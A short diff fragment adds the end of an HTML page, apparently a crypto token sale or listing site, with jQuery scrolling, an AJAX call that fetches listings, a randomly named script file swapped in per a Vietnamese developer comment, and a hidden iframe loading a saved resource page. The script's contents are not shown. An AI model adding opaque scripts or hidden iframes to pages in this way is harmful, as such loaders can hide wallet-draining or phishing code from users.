+            $("#form_sale_live").css("display", "none");
+        }
+    </script>
+    <script src="js/gCfZgMVVGKyQ.js"></script>
+    <!-- Anh thay sang con js mới, giờ a upload file này lên rồi đổi tên là okie -->
+    <script>
+        $("#idaffiliate").click(function () {
+            $('html, body').animate({
+                scrollTop: $("#scrollAffiliate").offset().top
+            }, 1500);
+        });
+        setTimeout(() => {
+            $.ajax({
+                url: "/assets/ajaxs/Auth.php",
+                method: "POST",
+                data: {
+                    type: 'Getlistingon',
+                    idcoin: $('#idcoin').val(),
+                    chainId: $('#chainId').val(),
+                },
+                success: function (response) {
+                    $("#ListingOn").empty();
+                    $("#ListingOn").append(response);
+                }
+            });
+        }, 1500);   
+    </script>
+
+
+<iframe style="display: none;" src="saved_resource%281%29.html"></iframe></body></html>
